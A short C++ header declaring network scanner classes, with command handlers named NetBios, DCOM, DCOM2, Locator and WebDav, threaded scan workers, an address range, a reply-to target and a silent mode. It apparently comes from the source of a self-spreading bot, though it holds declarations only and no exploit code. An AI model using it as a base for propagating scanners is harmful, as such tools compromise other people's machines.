
#ifndef __SCANNER_H__
#define __SCANNER_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CScannerAuto
{
public:
	void Init();
};

class CScanner : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdNetBios, m_cmdDCOM, m_cmdDCOM2, m_cmdLocator, m_cmdWebDav, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bScanning;
};

class CScannerBase : public CThread
{
public:
	CScannerBase() { }
	virtual ~CScannerBase() { }
	virtual void *Run();

	virtual void StartScan(const CString &sHost)=0;
	virtual bool TestHost(const CString &sHost)=0;

	CString		 m_sScannerName;
	CString		 m_sRange;
	CString		 m_sReplyTo;
	int			 m_iTime;

	bool		 m_bSilent;
	bool		 m_bNotice;

	CScanner	*m_pScanner;
};

#endif // __SCANNER_H__
